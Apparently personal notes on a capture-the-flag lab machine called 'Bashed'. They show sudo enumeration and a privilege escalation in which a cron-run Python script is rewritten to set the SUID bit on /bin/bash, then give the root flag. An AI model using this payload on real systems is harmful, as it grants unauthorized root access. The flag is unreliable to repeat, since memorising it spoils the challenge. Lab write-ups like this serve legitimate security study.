running sudo -l 

www-data@bashed:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL

so we can basically run sudo -u scriptmanager and the command we want 
sudo -u scriptmanager /b

running ls on / directory we find a weird directory which is scripts 

running ls -la we find out that test.py time always gets up to date which means
means there is a corn job probably running every minute and execute that file 
![[Pasted image 20210923144417.png]]
and we own that file so we can modify the commands inside and do this 
#!/usr/bin/python
import os

os.system("chmod +s /bin/bash")
to give bash suid perm and we can just run it and get root
![[Pasted image 20210923144849.png]]
![[Pasted image 20210923144913.png]]
#rootflag cc4f0afe3a1026d402ba10329674a8e2